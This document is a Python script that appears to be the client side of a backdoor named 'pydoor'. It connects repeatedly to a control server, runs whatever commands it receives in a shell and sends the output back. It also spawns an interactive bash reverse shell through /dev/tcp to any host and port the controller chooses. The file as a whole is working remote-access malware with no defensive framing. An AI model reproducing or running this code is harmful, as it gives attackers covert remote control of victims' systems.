#!/usr/bin/env python

import socket
import time
import subprocess
import os
import sys

BUFFER = 4096


class Client:
    def __init__(self):
        self.sock = 0
        self.cmd = 0
        self.shell = "/bin/sh"
        self.args = 0


    def sleep(self):
        self.sock.send(b"pydoor.quit")
        time.sleep(1) #Temporary solution
        self.sock.close()
        self.start()

    def checkbash(self):
        
        try:

            subprocess.run(["bash","--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
            self.shell = "/bin/bash"
        except:
            pass

    def checkinstall(self, prog):
        try:

            subprocess.call([prog, "--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
            return True
        except:
            return False

    def argumentize(self):
        self.args = self.cmd.split()
        print(self.cmd[1])


    def processcmd(self):


        if self.cmd:
            print(self.cmd)
            self.argumentize()

            if self.args[0] == "shell":
                subprocess.run([self.shell + f" -i >& /dev/tcp/{self.args[1]}/{self.args[2]} 0>&1"], shell=True)
            elif self.args[0] == "quit":
                self.sock.sendall(b"pydoor.quit")
                sys.exit(0)
            elif self.args[0] == "sleep":
                self.sleep()
            elif self.args[0] == "setshell":
                
                if self.checkinstall(self.args[1]):
                    self.shell = self.args[1]
                    self.sock.sendall(b"Shell successfully changed to" + self.shell.encode())
                else:
                    self.sock.sendall(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
                

            
            else:
                j = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE, executable=self.shell)
                out = j.communicate()
                self.sock.sendall(out[0])

    def start(self):
        
        print("Starting client" )

        self.checkbash()

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:

            try:
                
                self.sock.connect(("127.0.0.1", 9999))
                print("Connected to server")
                self.sock.send(b"Hey")
                while True:
                    self.cmd = self.sock.recv(BUFFER).decode()
                    
                    self.processcmd()
            except SystemExit:
                
                self.sock.send(b"pydoor.quit")
                sys.exit(0)
            except KeyboardInterrupt:
                sys.exit(0)

            except:
                pass
            time.sleep(10) #This is to avoid high cpu usage when the client is running without any server to hear 
                

if __name__ == "__main__":
    c = Client()

    c.start()